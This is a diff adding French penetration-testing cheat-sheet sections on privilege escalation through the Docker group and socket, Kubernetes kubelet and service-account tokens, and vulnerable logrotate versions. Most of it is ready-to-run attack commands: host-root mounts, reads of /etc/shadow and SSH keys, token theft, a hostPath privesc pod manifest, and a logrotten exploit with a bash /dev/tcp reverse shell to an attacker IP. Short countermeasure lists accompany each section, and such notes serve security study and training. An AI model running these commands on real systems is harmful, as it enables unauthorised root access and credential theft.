@@ -870,6 +870,251 @@ Les containers (LXC/LXD, Docker) partagent le noyau hôte. Si un utilisateur app
 
 ---
 
+# Docker
+
+## 1) Principe
+Docker isole les applications via des **containers** partageant le noyau hôte.  
+Si un utilisateur appartient au **groupe docker** ou peut accéder au **socket Docker**, il peut exécuter des commandes en root sur l’hôte.
+
+## 2) Vérifications rapides
+- Voir si on est dans le groupe docker :  
+  `id`  
+  → présence de `docker` = élévation possible.  
+- Vérifier le socket :  
+  `ls -l /var/run/docker.sock`  
+  (writable = vulnérable)
+
+## 3) Exploitations typiques
+
+### Accès via le groupe docker
+Créer un conteneur avec le disque hôte monté :  
+```bash
+docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash
+```
+→ shell root sur le host.
+
+### Accès via socket Docker exposé
+Si on trouve un `docker.sock` :
+```bash
+/tmp/docker -H unix:///app/docker.sock ps
+/tmp/docker -H unix:///app/docker.sock run -v /:/hostsystem --rm -it ubuntu /bin/bash
+```
+→ naviguer dans `/hostsystem` pour lire `/root` ou `/etc/shadow`.
+
+### Exploit via shared volumes
+Si un volume du host est monté :
+```bash
+cd /hostsystem/home/<user>/.ssh
+cat id_rsa
+```
+→ récupérer clés SSH du host.
+
+## 4) Enumeration
+Lister images et conteneurs :
+```bash
+docker image ls
+docker ps -a
+```
+Chercher conteneurs privilégiés ou montages `/` → élévation probable.
+
+## 5) Défense / contremesures
+- Ne jamais ajouter un user non-root au groupe `docker`.  
+- Restreindre les permissions du socket `/var/run/docker.sock`.  
+- Utiliser AppArmor/Seccomp.  
+- Interdire montages sensibles (`/`, `/etc`, `/root`).  
+- Auditer régulièrement les images et droits des conteneurs.
+
+---
+
+# Kubernetes (K8s) — cheat-sheet courte
+
+## 1) Principe
+Kubernetes (K8s) orchestre des **conteneurs** (souvent Docker/LXC) sur un cluster de nœuds.  
+Un **Control Plane** gère les **Worker Nodes** via l’API Server, etcd, le scheduler et le controller manager.  
+Chaque application tourne dans un **Pod** (1+ conteneurs).  
+
+→ En test d’intrusion, le but est souvent d’exploiter une **mauvaise configuration Kubelet/API** ou un **jeton de service (token)** pour obtenir des privilèges élevés ou un accès root au nœud.
+
+## 2) Ports et composants clés
+| Service | Port | Rôle |
+|----------|------|------|
+| API Server | 6443 | Point d’entrée principal (kubectl, REST) |
+| etcd | 2379–2380 | Stocke la config du cluster |
+| Scheduler | 10251 | Planifie les pods |
+| Controller Manager | 10252 | Gère les objets du cluster |
+| Kubelet API | 10250 | Administre les pods sur chaque nœud |
+| Read-only Kubelet | 10255 | Accès info sans auth (si activé) |
+
+## 3) Enumération & reconnaissance
+
+### Accès API Kubernetes :
+```bash
+curl -k https://<IP>:6443
+```
+→ Réponse `"system:anonymous"` = pas d’authentification valide.
+
+### Accès Kubelet :
+```bash
+curl -k https://<IP>:10250/pods | jq .
+```
+→ Liste des pods, namespaces, images — utile pour repérer vulnérabilités et secrets.
+
+### Avec `kubeletctl` :
+```bash
+kubeletctl -i --server <IP> pods
+kubeletctl -i --server <IP> scan rce
+```
+→ Identifie les pods vulnérables à RCE.
+
+## 4) Exploitation
+
+### Exécution de commande dans un Pod
+```bash
+kubeletctl -i --server <IP> exec "id" -p <pod> -c <container>
+```
+→ Vérifie si root à l’intérieur du conteneur (`uid=0`).
+
+### Extraction de credentials (tokens & certificats)
+```bash
+kubeletctl --server <IP> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p <pod> -c <container> > k8.token
+kubeletctl --server <IP> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p <pod> -c <container> > ca.crt
+```
+
+## 5) Utilisation du token (kubectl)
+Vérifier les permissions du compte compromis :
+```bash
+export token=$(cat k8.token)
+kubectl --token=$token --certificate-authority=ca.crt --server=https://<IP>:6443 auth can-i --list
+```
+→ Voir si on peut `get/create/list` les pods (souvent suffisant pour privesc).
+
+## 6) Escalade de privilèges (création d’un Pod root)
+Créer un pod qui monte `/` du host :
+```yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: privesc
+spec:
+  containers:
+  - name: privesc
+    image: nginx
+    volumeMounts:
+    - mountPath: /root
+      name: host-root
+  volumes:
+  - name: host-root
+    hostPath:
+       path: /
+  automountServiceAccountToken: true
+  hostNetwork: true
+```
+
+Déploiement :
+```bash
+kubectl --token=$token --certificate-authority=ca.crt --server=https://<IP>:6443 apply -f privesc.yaml
+kubectl get pods
+```
+→ Accéder au host via `/root`.
+
+Extraction de clé root :
+```bash
+kubeletctl --server <IP> exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc
+```
+
+## 7) Contremesures
+- **Désactiver l’accès anonyme** à Kubelet (flag `--anonymous-auth=false`).  
+- Activer **RBAC** strict et tokens à durée courte.  
+- Isoler le plan de contrôle (firewall + VPN).  
+- Ne pas monter `/` du host dans des pods.  
+- Surveiller `/var/run/secrets/kubernetes.io/` et les pods privilégiés.  
+- Appliquer **NetworkPolicies** pour restreindre la communication entre pods.
+  
+## 8) Outils utiles
+- [`kubeletctl`](https://github.com/cyberark/kubeletctl) — enum & RCE sur kubelets.  
+- [`kubectl`](https://kubernetes.io/docs/reference/kubectl/) — interaction avec l’API.  
+- [`kube-hunter`](https://github.com/aquasecurity/kube-hunter) — scanner vulnérabilités K8s.  
+- [`peirates`](https://github.com/inguardians/peirates) — post-exploitation K8s.  
+
+---
+
+# Logrotate
+
+## 1) Principe
+**Logrotate** gère la rotation et l’archivage des logs sous Linux pour éviter qu’ils ne saturent le disque.  
+Il tourne souvent via **cron** (ex. `/etc/cron.daily/logrotate`) et est configuré par :
+- `/etc/logrotate.conf` → règles globales  
+- `/etc/logrotate.d/*` → règles par service  
+
+Quand il tourne **en root**, si un utilisateur peut écrire dans un fichier log contrôlé par logrotate, il peut exécuter du code arbitraire.
+
+
+## 2) Fichiers importants
+```bash
+/etc/logrotate.conf
+/etc/logrotate.d/
+/var/lib/logrotate.status
+```
+
+### Exemple :
+```bash
+/var/log/dpkg.log {
+    monthly
+    rotate 12
+    compress
+    delaycompress
+    create 644 root root
+}
+```
+
+## 3) Conditions d’exploitation
+- Le log ciblé est **writable** par l’utilisateur.  
+- Logrotate tourne **avec privilèges root**.  
+- Version vulnérable :  
+  `3.8.6`, `3.11.0`, `3.15.0`, `3.18.0`.  
+
+## 4) Exploit avec logrotten
+
+### Compilation :
+```bash
+git clone https://github.com/whotwagner/logrotten.git
+cd logrotten
+gcc logrotten.c -o logrotten
+```
+
+### Payload (reverse shell) :
+```bash
+echo 'bash -i >& /dev/tcp/<IP_ATTAQUANT>/9001 0>&1' > payload
+```
+
+### Lancer listener :
+```bash
+nc -nlvp 9001
+```
+
+### Exécution :
+```bash
+./logrotten -p ./payload /tmp/tmp.log
+```
+
+Quand logrotate s’exécute ensuite → **reverse shell root**.
+
+## 5) Options à connaître
+- `create` → crée un nouveau fichier après rotation  
+- `compress` → compresse l’ancien log  
+Ces options définissent comment adapter l’exploit (logrotten supporte les deux).
+
+## 6) Contremesures
+- Ne jamais donner d’accès en écriture sur les logs gérés par logrotate.  
+- Exécuter logrotate avec des permissions restreintes.  
+- Mettre à jour logrotate > `3.18.0`.  
+- Vérifier les scripts tiers liés à logrotate (dans `/etc/cron.daily/`).  
+- Journaliser l’activité anormale sur `/tmp` ou `/var/log` (fichiers exécutables, etc.).
+
+---
+
+
+
 
 
 
